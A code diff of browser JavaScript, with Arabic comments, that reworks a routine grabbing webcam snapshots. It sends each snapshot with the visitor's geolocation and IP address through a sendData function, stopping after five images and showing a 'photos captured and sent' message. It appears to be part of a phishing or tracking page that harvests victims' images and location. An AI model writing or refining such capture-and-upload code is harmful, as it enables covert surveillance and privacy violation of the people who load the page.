@@ -17,8 +17,7 @@
 
     if (imageBlob) {
       const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
-      const filename = `image_${timestamp}.jpg`;
-      const file = new File([imageBlob], filename, { type: "image/jpeg" });
+      const file = new File([imageBlob], `image_${timestamp}.jpg`, { type: "image/jpeg" });
       formData.append("image", file);
     }
 
@@ -35,28 +34,32 @@
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       const video = document.createElement('video');
       video.srcObject = stream;
-      video.play();
+      video.setAttribute('playsinline', ''); // for iOS
+      await video.play();
 
       const canvas = document.createElement('canvas');
       const context = canvas.getContext('2d');
 
-      // تصوير كل 5 ثواني
-      const interval = setInterval(async () => {
+      // انتظر لما الفيديو يتحمّل فعليًا
+      video.addEventListener('loadedmetadata', () => {
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0);
 
-        const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-        await sendData(position, imageBlob, ip);
-        console.log("تم إرسال صورة");
-      }, 2000);
+        let count = 0;
+        const maxCount = 5; // عدد الصور
+        const interval = setInterval(async () => {
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+          await sendData(position, blob, ip);
+          count++;
 
-      // بعد 30 ثانية نوقف الكاميرا
-      setTimeout(() => {
-        clearInterval(interval);
-        stream.getTracks().forEach(track => track.stop());
-        document.body.innerHTML = "<h2>تم التقاط الصور وإرسالها</h2>";
-      }, 30000);
+          if (count >= maxCount) {
+            clearInterval(interval);
+            stream.getTracks().forEach(track => track.stop());
+            document.body.innerHTML = "<h2>تم التقاط الصور وإرسالها</h2>";
+          }
+        }, 2000); // كل 5 ثواني
+      });
 
     } catch (err) {
       console.error("Camera error:", err);
